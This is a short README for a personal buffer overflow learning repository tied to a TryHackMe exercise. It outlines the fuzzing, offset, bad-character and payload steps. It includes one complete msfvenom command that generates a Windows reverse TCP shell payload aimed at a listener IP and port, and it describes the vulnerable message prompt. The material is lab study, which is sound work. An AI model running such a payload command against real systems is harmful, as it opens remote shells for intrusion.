# BoF
Buffer Overflow Script
(Typos exist)

We start with saying. This is just for documentation and me for learning Buffer Overflows.
I will explain in the script what is goning on instead of writing it here.
Sometimes I edit script 10 times to get it to work, and I do not want to update the README every time.

More details and step by step can be bound here: 
https://jensoroger.wordpress.com/2021/01/19/explain-in-my-own-way-how-to-do-basic-buffer-overflow-with-help-from-realtryhackme-bufferoverlow-hacking-infosec-linux4hackers-pentest-pentesting-redteam/

## Step 1 General about fuzzing
The Goal here is to crash tha application and make the application execute "our" that we decide.
You need to know how the application works, are login first and the something else that we want to fuzz (crash).

## Step 2 Finding the offset
The goal here is to get control of EIP int the stack, for that to happend we need to find the offset

## Step 3 Find bad characters that we can not use in our payload


## Step 4 Creating the payload
Here you need to know what OS is running the application. It is hard to create a reverse shell from Windows machine with a payload for Linux.
Also the padding my need som ajustments.

Payload exemples that you can use the out put in the script
LHOST=Your attacker box IP
LPORT=What port will the victim use to connect to your attack box
-b= That is the bad characters that you will find in step 3
-f=The output will be in pyton, so we can add this payload to the script.
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.89.215 LPORT=4444 EXITFUNC=thread -b "x00\xa9\xcd\xd4" -f py

## Brainstorm from tryhackme
The main thing in this BoF was that the first thing that happens when you connect to the application on port 9999
is that a login appears.This has maximum 20 char. Tried first fuzzing that. But found out that this is not gonna happend.
When you enter a username and then you are getting a send message prompt and that is vulnerble.
So in our payload we need to sen Username and a payload.


